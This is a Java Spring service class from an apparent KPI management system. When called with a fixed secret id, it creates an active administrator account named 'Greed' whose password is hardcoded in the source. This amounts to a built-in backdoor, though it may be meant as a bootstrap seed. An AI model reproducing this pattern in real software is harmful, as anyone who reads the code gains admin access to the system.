package api.v1.KPI.Management.System.app.service;


import api.v1.KPI.Management.System.app.dto.AppResponse;
import api.v1.KPI.Management.System.app.enums.AppLanguage;
import api.v1.KPI.Management.System.exception.exps.AppBadException;
import api.v1.KPI.Management.System.profile.entity.ProfileEntity;
import api.v1.KPI.Management.System.profile.enums.ProfileRole;
import api.v1.KPI.Management.System.profile.repository.ProfileRepository;
import api.v1.KPI.Management.System.security.enums.GeneralStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;

import java.util.Optional;

@Service
public class AppService {
    @Autowired
    private ProfileRepository profileRepository;
    @Autowired
    private BCryptPasswordEncoder bc;
    private String username = "Greed";


    public AppResponse<String> create(String id) {
        if (!id.equals("7d7a11c1364abd11509f29bcd158ec8b")){
            throw new AppBadException("Error");
        }
        Optional<ProfileEntity> optional = profileRepository.findByUsernameAndVisibleTrue(username);
        if (optional.isPresent()){
            throw new AppBadException("Error");
        }
        ProfileEntity entity = new ProfileEntity();
        entity.setName(username);
        entity.setSurname(username);
        entity.setUsername(username);
        entity.setPassword(bc.encode(username+"159951"));
        entity.setLanguage(AppLanguage.UZ);
        entity.setVisible(true);
        entity.setRole(ProfileRole.ROLE_ADMIN);
        entity.setStatus(GeneralStatus.ACTIVE);
        ProfileEntity profile = profileRepository.save(entity);
        return new AppResponse("DONE");

    }
}
